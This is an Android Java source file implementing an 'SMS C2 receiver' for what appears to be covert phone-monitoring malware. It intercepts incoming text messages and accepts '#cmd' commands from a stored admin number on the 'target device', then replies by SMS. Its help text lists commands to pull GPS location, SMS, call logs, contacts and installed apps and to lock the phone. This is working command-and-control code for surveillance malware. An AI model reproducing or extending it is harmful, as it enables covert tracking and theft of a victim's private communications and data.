// language: Java, file: SmsReceiver.java, target: Android API 26+
// *SMS C2 receiver — no auto-admin register, normalized sender match*
package com.rk.agent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.ArrayList;

public class SmsReceiver extends BroadcastReceiver {

    static final String TAG = "SMS_C2";
    static final String PREFS = "cfg";
    static final String KEY_ADMIN = "admin_sms";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            if (intent == null) return;
            String action = intent.getAction();
            if (action == null) return;
            if (!Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(action)) return;

            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null || pdus.length == 0) return;

            String format = bundle.getString("format");

            StringBuilder body = new StringBuilder();
            String sender = null;

            for (Object pdu : pdus) {
                try {
                    SmsMessage sm;
                    if (Build.VERSION.SDK_INT >= 23) {
                        sm = SmsMessage.createFromPdu((byte[]) pdu, format);
                    } else {
                        sm = SmsMessage.createFromPdu((byte[]) pdu);
                    }
                    if (sm == null) continue;
                    if (sender == null) {
                        sender = sm.getDisplayOriginatingAddress();
                        if (sender == null) sender = sm.getOriginatingAddress();
                    }
                    body.append(sm.getMessageBody());
                } catch (Exception e) {
                    Log.e(TAG, "pdu parse err: " + e.getMessage());
                }
            }

            if (sender == null || body.length() == 0) return;
            final String msgText = body.toString().trim();

            Log.d(TAG, "SMS from=" + sender + " body=" + msgText);

            SharedPreferences sp = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
            String admin = sp.getString(KEY_ADMIN, "");

            // NO AUTO-REGISTER — admin must be set first
            if (admin == null || admin.isEmpty()) {
                Log.d(TAG, "admin not configured — ignoring SMS");
                reply(context, sender,
                    "NOT CONFIGURED\n"
                    + "Admin number is not set on target device.");
                return;
            }

            String nSender = normalize(sender);
            String nAdmin = normalize(admin);

            boolean isMatch = false;
            if (nSender.equals(nAdmin)) isMatch = true;
            if (!isMatch && nSender.length() >= 9 && nAdmin.length() >= 9) {
                if (nSender.substring(nSender.length() - 9)
                    .equals(nAdmin.substring(nAdmin.length() - 9))) {
                    isMatch = true;
                }
            }

            if (!isMatch) return;
            if (!msgText.startsWith("#cmd")) return;

            String cmd = msgText.substring(4).trim();
            Log.d(TAG, "cmd=" + cmd);

            // Try main service first
            AgentService svc = AgentService.INSTANCE;
            if (svc != null) {
                try {
                    String response = svc.executeSmsCommand(cmd);
                    if (response != null) reply(context, sender, response);
                    return;
                } catch (Exception e) {
                    Log.e(TAG, "service exec err: " + e.getMessage());
                }
            }

            // Fallback — basic commands only
            String result = basicCommand(context, cmd);
            if (result != null) reply(context, sender, result);

        } catch (Exception e) {
            Log.e(TAG, "fatal: " + e.getMessage());
        }
    }

    String basicCommand(Context context, String cmd) {
        try {
            String[] p = cmd.split("\\s+", 2);
            String c = p[0].toLowerCase();
            String args = p.length > 1 ? p[1] : "";

            if (c.isEmpty() || c.equals("help")) return helpText();
            if (c.equals("ping")) return "pong";
            if (c.equals("time")) return "time: " + new java.util.Date().toString();
            if (c.equals("status")) {
                boolean svc = AgentService.INSTANCE != null;
                String a = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                    .getString(KEY_ADMIN, "");
                return "service: " + (svc ? "RUNNING" : "STOPPED")
                     + "\nadmin: " + a;
            }
            // NOTE: no resetsms, no admin change in fallback
            return "SERVICE OFFLINE.\nOnly basic commands work:\n" + basicHelp();
        } catch (Exception e) {
            return "err: " + e.getMessage();
        }
    }

    String basicHelp() {
        return "#cmd help\n#cmd ping\n#cmd time\n#cmd status";
    }

    String helpText() {
        return "SMS C2 HELP\n"
             + "Basic (always work):\n"
             + "#cmd ping\n#cmd time\n#cmd status\n\n"
             + "Full (service must run):\n"
             + "#cmd info\n#cmd gps\n#cmd sms\n#cmd calllog\n"
             + "#cmd contacts\n#cmd apps\n#cmd battery\n"
             + "#cmd torch on|off\n#cmd vibrate 2000\n#cmd lock";
    }

    void reply(Context context, String to, String body) {
        try {
            SmsManager sm = SmsManager.getDefault();
            if (body.length() <= 160) {
                sm.sendTextMessage(to, null, body, null, null);
            } else {
                ArrayList<String> parts = sm.divideMessage(body);
                sm.sendMultipartTextMessage(to, null, parts, null, null);
            }
            Log.d(TAG, "reply sent to " + to);
        } catch (Exception e) {
            Log.e(TAG, "reply err: " + e.getMessage());
        }
    }

    String normalize(String p) {
        try {
            if (p == null) return "";
            String d = p.replaceAll("[^0-9]", "");
            if (d.length() > 10 && d.startsWith("94")) d = d.substring(2);
            if (d.startsWith("0") && d.length() > 9) d = d.substring(1);
            return d;
        } catch (Exception e) { return p == null ? "" : p; }
    }
}
